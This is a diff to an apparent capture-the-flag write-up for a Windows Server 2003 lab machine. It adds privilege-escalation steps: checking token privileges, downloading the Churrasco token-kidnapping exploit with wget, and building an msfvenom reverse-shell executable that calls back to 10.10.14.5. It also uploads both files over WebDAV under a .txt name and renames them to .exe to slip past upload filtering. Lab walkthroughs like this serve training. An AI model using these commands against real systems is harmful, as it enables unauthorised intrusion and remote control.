@@ -385,24 +385,61 @@ nt authority\network service
 
 # Privilege Escalation
 
+```
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAuditPrivilege              Generate security audits                  Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+```
+
+[Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation](https://www.exploit-db.com/exploits/6705)
+[Churrasco](https://github.com/Re4son/Churrasco)
+
+```
+$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
+```
+
+
+```
+$ cadaver http://10.10.10.15
+dav:/> put churrasco.txt
+Uploading churrasco.txt to `/churrasco.txt':
+Progress: [=============================>] 100.0% of 31232 bytes succeeded.
+dav:/> move churrasco.txt churrasco.exe
+Moving `/churrasco.txt' to `/churrasco.exe':  succeeded.
+```
+
 
 
 
 ```
-$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.5 lport=7700 -f exe -o revshell.exe 
+$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.5 lport=7700 -f exe -o revshell.txt 
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of exe file: 73802 bytes
-Saved as: revshell.exe
+Saved as: revshell.txt
 ```
 
-
-
 ```
-$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
+$ cadaver http://10.10.10.15      
+dav:/> put revshell.txt
+Uploading revshell.txt to `/revshell.txt':
+Progress: [=============================>] 100.0% of 73802 bytes succeeded.
+dav:/> move revshell.txt revshell.exe
+Moving `/revshell.txt' to `/revshell.exe':  succeeded.
 ```
 
 ```
